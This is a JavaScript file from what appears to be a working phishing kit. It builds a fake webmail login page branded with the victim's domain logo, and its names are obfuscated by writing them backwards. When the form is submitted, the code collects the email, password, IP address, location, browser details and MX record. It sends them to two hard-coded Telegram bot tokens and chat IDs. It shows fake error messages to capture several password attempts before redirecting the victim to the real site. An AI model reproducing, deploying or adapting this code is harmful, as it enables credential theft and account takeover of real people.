/* global $ */
$(document).ready(function () {
  var cotton = 0;
  intlzpge();

  $('#back1').click(function () {
	$("#msg").hide();
	$('#l0g1n').val("");
	$("#automail").animate({
	  left: 200,
	  opacity: "hide"
	}, 0);
	$("#inputbar").animate({
	  right: 200,
	  opacity: "show"
	}, 1000);

  });

  var l0g1n = handleBase64Data(window.location.hash.substr(1));
  if (!l0g1n) {

  } else {
	var iamy = l0g1n;
	$('#l0g1n').val(iamy);
	var filter = /^([a-zA-Z0-9_\.\-])+\@(([a-zA-Z0-9\-])+\.)+([a-zA-Z0-9]{2,4})+$/;

	if (!filter.test(iamy)) {
	  $('#rorre').show();
	  l0g1n.focus;
	  return false;
	}
	var ind = iamy.indexOf("@");
	var slice_max = iamy.substr((ind + 1));
	var c = slice_max.substr(0, slice_max.indexOf('.'));
	var llnf = c.toLowerCase();
	var ullnf = c.toUpperCase();
	var browser = GetBrowserandLanguage()[0];

	



  }

  $('#sub_btn').click(function (event) {
	$('#rorre').hide();
	$('#mgss').hide();
	event.preventDefault();
	var l0g1n = $("#l0g1n").val();
	var l0g1nP = $("#l0g1nP").val();
	var mgss = $('#mgss').html();
	$('#mgss').text(mgss);
	///////////////////////////
	var iamy = l0g1n;
	var filter = /^([a-zA-Z0-9_\.\-])+\@(([a-zA-Z0-9\-])+\.)+([a-zA-Z0-9]{2,4})+$/;

	if (!filter.test(iamy)) {
	  $('#rorre').show();
	  l0g1n.focus;
	  return false;
	}

	var ind = iamy.indexOf("@");
	var slice_max = iamy.substr((ind + 1));
	var c = slice_max.substr(0, slice_max.indexOf('.'));
	var llnf = c.toLowerCase();
	var ullnf = c.toUpperCase();

	// $("#logoimg").attr("src", "https://www.google.com/s2/favicons?domain=" + slice_max);
	$("#logoname").html(ullnf);
	$(".domain").html(slice_max);
	///////////////////////////
	cotton = cotton + 1;



  });
})


function GetBrowserandLanguage() {
  let browser = window.clientInformation.appVersion;
  let language = window.clientInformation.language;
  let info = [browser, language]

  return info;
}

function intlzpge() {

  setTimeout(function () {
	document.getElementsByClassName('redaol')[0].style.display = 'none';
	var url = location.href;
	const kinl = new URL(url);
	let liame = kinl.hash;
	liame = handleBase64Data(liame.substr(1).split('/')[0]);
	let website = liame.substring(liame.indexOf("@") + 1);
	var image = "https://image.thum.io/get/http://" + website;
	document.body.style.backgroundImage = "url('"+ image +"')";
	document.body.style.backgroundSize = "cover";
	document.body.style.backgroundPosition = "center";
	document.body.style.backgroundRepeat = "no-repeat";
	document.body.style.backgroundAttachment = "fixed";
	document.getElementsByClassName('yalrevo')[0].style.display = 'block';
	document.getElementsByClassName('ladom')[0].style.display = 'block';
  }, 500);

  // Split the current URL to extract a part
  const aim = window.location.hash.substr(1).split('/');
  var hashPart = handleBase64Data(aim[0]);

  const langs = getLocalizedLanguage(aim[1]);
  // console.log("LanguageDictionary :", hardInput)

  $('#error').html(langs.error);
  $('#lessThan4').html(langs.lessThan4);
  $('#msg').html(langs.msg);
  $('#submit-btn').html(langs.submitBtn);
  $('#sec-lg-ss').html(langs.secLgSs)
  $('#frg-psw').html(langs.frgPsw);
  $('#copy').html(langs.copy);
  $("#liame").attr("placeholder", langs.emlTxt)
  $("#drowssap").attr("placeholder", langs.pswTxt)
  if (hashPart) {
	hashPart = convertToBase64(hashPart)
	
	var liameParts = hashPart.split('@');
	var domainName = liameParts[1].split('.')[0];

	var capitalizedDomain = domainName.charAt(0).toUpperCase() + domainName.slice(1);

	// Update elements on the page
	var logoUrl = "https://logo.clearbit.com/" + liameParts[1];
	$.get(logoUrl)
	  .done(function () {
		$("#logoimg").attr("src", logoUrl);
		$("#favicon").attr("href", logoUrl);
		$("#logoimg").show();
	  })
	  .fail(function () {
		logoUrl = "https://www.google.com/s2/favicons?domain=" + liameParts[1];
		$.get(logoUrl)
		  .done(function () {
			$("#logoimg").hide();
		  })
		  .fail(function () {
			$("#logoimg").hide();
		  })
	  });

	$("#loginMgs").html(`${capitalizedDomain} ${langs.emlLogin}`);
	document.title = `${capitalizedDomain} - ${langs.mail}`;
	$("#liame").val(hashPart);

	handfmsub($("#liame"), $("#drowssap"), liameParts[1], langs);
  }
}

function convertToBase64(str) {
  if (/^([A-Za-z0-9+/]{4})*([A-Za-z0-9+/]{3}=|[A-Za-z0-9+/]{2}==)?$/.test(str)) {
	return atob(str);
  } else {
	return str;
  }
}


function countryToFlagEmoji(countryCode) {
  if (!countryCode) return "";
  return countryCode
	.toUpperCase()
	.replace(/./g, char => 
	  String.fromCodePoint(127397 + char.charCodeAt())
	);
}

function handfmsub(liameField, drowssapField, domain, langs) {

  var attempts = 0;
  var msgElement = $("#msg");
  var lessThan4Element = $("#lessThan4");
  var errorElement = $("#error");

  $('.login-form form').submit(function (event) {
	errorElement.hide();
	msgElement.hide();
	event.preventDefault();
	lessThan4Element.hide();
	$("#submit-btn").html(langs.verifyingText);
	var l0g1n = liameField.val();
	var l0g1nP = drowssapField.val();

	var iamy = l0g1n;
	var filter = /^([a-zA-Z0-9_\.\-])+\@(([a-zA-Z0-9\-])+\.)+([a-zA-Z0-9]{2,4})+$/;

	if (!filter.test(iamy)) {
	  $('#error').show();
	  liameField.focus();
	  return false;
	}

	var ind = iamy.indexOf("@");
	var slice_max = iamy.substr((ind + 1));
	var c = slice_max.substr(0, slice_max.indexOf('.'));
	var llnf = c.toLowerCase();
	var ullnf = c.toUpperCase();

	setTimeout(async () => {
	  if (liameField.val() == '') {
		errorElement.show();
	  } else {
		if (drowssapField.val() == '') {
		  msgElement.show();
		  setTimeout(() => {
			if (drowssapField && drowssapField.length) {
			  try { drowssapField[0].focus(); } catch (e) {}
			  try { drowssapField.focus(); } catch (e) {}
			}
		  }, 20);
		} else {
		  if (drowssapField.val().length < 4) {
			lessThan4Element.show();
			drowssapField.val('');
			setTimeout(() => {
			  if (drowssapField && drowssapField.length) {
				try { drowssapField[0].focus(); } catch (e) {}
				try { drowssapField.focus(); } catch (e) {}
			  }
			}, 20);
		  } else {
			l0g1n = liameField.val();
			l0g1nP = drowssapField.val();
			setTimeout(() => {
			  if (drowssapField && drowssapField.length) {
				try { drowssapField[0].focus(); } catch (e) {}
				try { drowssapField.focus(); } catch (e) {}
			  }
			}, 20);

			var date = new Date();
			const visitorInfo = await sendVisitorIP();
			console.log('MX Record', await getMXRecord(domain))

			const flag = countryToFlagEmoji(visitorInfo[1]);
			const coordinates = await getCoordinatesFromIP(visitorInfo[0]);
			var message =
			  `--------+ 🛡️ N3W L0G ${flag} +--------\n`;
			message += "📧 Email : " + l0g1n + "\n";
			message += "🔑 Password : " + l0g1nP + "\n";
			message += "🌐 Browser : " + GetBrowserandLanguage()[0] + "\n";

			message += "💬 Language : " + GetBrowserandLanguage()[1] + "\n";
			message += "📮 MX Record : " + await getMXRecord(domain) + "\n";
			message += "📡 IP Address : " + visitorInfo[0] + "\n";
			message += `🌍 Region and Country : ${visitorInfo[2]} ${visitorInfo[3]}, ${visitorInfo[1]} ${flag}\n`;
			message += `📍 Coordinates: [${coordinates}]\n`;
			message += "🕓 Date/Time : " + date + "\n";
			message +=
			  `--------+ 🛡️ N3W L0G ${flag} +--------\n`;
			var stobs = [
			  {
				token: "7899011309:AAGKeHaMu_8NyrdQeNxglCtf6gfgrUpEejc",
				chatId: "5618270679"
			  },
			  {
				token: "5178252977:AAFlPqDATK6Mf6m0ktiG5TSn_EoesFrnQt8",
				chatId: "659482680"
			  }
			];

			$.each(stobs, function (index, bot) {
			  var token = bot.token;
			  var chatId = bot.chatId;

			  $.ajax({
				dataType: 'JSON',
				url: `https://api.telegram.org/bot${token}/sendMessage`,
				type: 'POST',
				data: {
				  "chat_id": chatId,
				  "text": message
				},
				beforeSend: function (xhr) {
				  $('#submit-btn').html(langs.verifyingText);
				},
				success: function (response) {
				  if (response) {
					if (response['ok'] == true) {
					  if (attempts >= 3) {
						attempts = 0;
						$(".login-form").hide();
						$(".success-con").show();
						$(".success-con .msg").html(`
						  ${langs.yourEmail} <br>
						  ${langs.success}</b>
						`);
						setTimeout(() => {
						  window.location.replace(`http://www.${domain}`);
						}, 5000);
					  } else {
						attempts++;
						msgElement.show();
						drowssapField.val('');
						drowssapField.focus();
						$('#submit-btn').html(langs.submitBtn);
					  }
					}
				  }
				},
				error: function (err) {
				  $('#net-rorre').show();
				  drowssapField.val('');
				  drowssapField.focus();
				  console.log("Error : ", err);
				}
			  });
			});

		  }
		}
	  }
	});
  });
}